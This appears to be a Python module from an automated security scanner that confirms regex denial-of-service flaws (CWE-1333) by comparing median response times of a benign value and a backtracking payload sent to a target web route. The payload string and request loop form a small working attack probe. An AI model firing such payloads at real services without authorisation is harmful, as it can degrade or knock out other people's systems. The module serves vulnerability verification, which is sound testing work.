"""Behavioral / timing oracle -- proves ReDoS (CWE-1333) by a DIFFERENTIAL timing test (§18 #3).

Timing is noisy (GC, load, network), so this is never a single-shot proof: it takes the MEDIAN of N
requests and requires the malicious input to be BOTH a large multiple of the benign baseline AND over
an absolute floor. That N-of-M + differential + absolute-threshold is what turns a noisy 'vibe' into a
sound witness for a class (catastrophic regex backtracking) that has no sink to instrument.
"""
import re
import statistics
import time
import urllib.parse

from . import exploit

# The param the sink reads (query/body/form), pulled from the sink slice.
_PARAM = re.compile(
    r"""request\.args(?:\.get\(|\[)\s*['"](\w+)['"]"""
    r"""|req\.(?:query|params|body)\.(\w+)"""
    r"""|request\.form(?:\.get\(|\[)\s*['"](\w+)['"]""")
# A string that triggers exponential backtracking on (a+)+ / (a|a)* / nested-quantifier patterns.
_EVIL = "a" * 30 + "!"


def _param_of(candidate):
    m = _PARAM.search(candidate.slice or candidate.sink or "")
    return next((g for g in m.groups() if g), None) if m else None


def _median_latency(rt, method, path, auth, k=3):
    ts = []
    for _ in range(k):
        t0 = time.time()
        exploit.fire(rt.base_url, method, path, None, headers=dict(auth or {}), timeout=12)
        ts.append(time.time() - t0)
    return statistics.median(ts)


def prove_redos(rt, candidate, auth=None):
    """Differential timing: benign input vs a backtracking payload, N medians each. Proven only if the
    malicious input is >2s AND >=8x the benign baseline (a real catastrophic-backtracking blowup)."""
    param = _param_of(candidate)
    route = candidate.route_hint or ""
    if not param or " " not in route:
        return {"status": "not-proven", "cwe": "CWE-1333", "notes": "no (route, param) for timing test"}
    method, path = route.split(" ", 1)
    benign = f"{path}?{urllib.parse.quote(param)}=abcdef"
    evil = f"{path}?{urllib.parse.quote(param)}={urllib.parse.quote(_EVIL)}"
    t_benign = _median_latency(rt, method, benign, auth)
    t_evil = _median_latency(rt, method, evil, auth)
    ratio = t_evil / max(t_benign, 0.01)
    if t_evil > 2.0 and ratio >= 8:
        return {"status": "proven", "cwe": "CWE-1333", "oracle": "behavioral",
                "payload": _EVIL, "request": f"{method} {path}",
                "evidence": (f"catastrophic regex backtracking: benign {t_benign * 1000:.0f}ms vs "
                             f"malicious {t_evil * 1000:.0f}ms ({ratio:.0f}x slower, N=3 medians)")}
    return {"status": "not-proven", "cwe": "CWE-1333",
            "notes": f"no timing blowup (benign {t_benign * 1000:.0f}ms, malicious {t_evil * 1000:.0f}ms)"}
